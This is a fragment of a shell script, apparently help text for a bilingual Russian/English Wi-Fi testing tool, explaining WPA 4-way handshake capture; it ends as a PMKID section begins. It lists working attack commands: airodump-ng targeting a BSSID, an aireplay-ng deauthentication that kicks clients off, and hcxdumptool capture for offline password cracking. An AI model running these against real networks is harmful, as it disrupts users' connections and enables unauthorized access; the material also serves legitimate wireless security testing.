help_sec_handshake(){
    _hh "$(L "Захват Handshake (рукопожатие)" "Handshake capture")"
    _hp "$(L "4-way handshake (M1-M2-M3-M4) — обмен при подключении клиента к сети. Содержит данные для офлайн-подбора пароля. Нужен активный клиент на сети." "The 4-way handshake (M1-M2-M3-M4) is the exchange when a client connects. It contains data for offline password cracking. Requires an active client on the network.")"
    _hp "$(L "Метод: deauth (выбить клиента) → он переподключается → ловим все 4 части. wh делает это через hcxdumptool." "Method: deauth (kick the client) → it reconnects → we capture all 4 parts. wh does this via hcxdumptool.")"
    _hp "$(L "Ручные команды:" "Manual commands:")"
    _hc "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hs wlan0mon"
    _hc "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon   $(L "# в другом окне" "# in another window")"
    _hc "sudo hcxdumptool -i wlan0mon -o hs.pcapng --enable_status=31"
    _hw "$(L "Нужен подключённый клиент. Нет клиента — нет handshake." "A connected client is required. No client — no handshake.")"
}

help_sec_pmkid(){
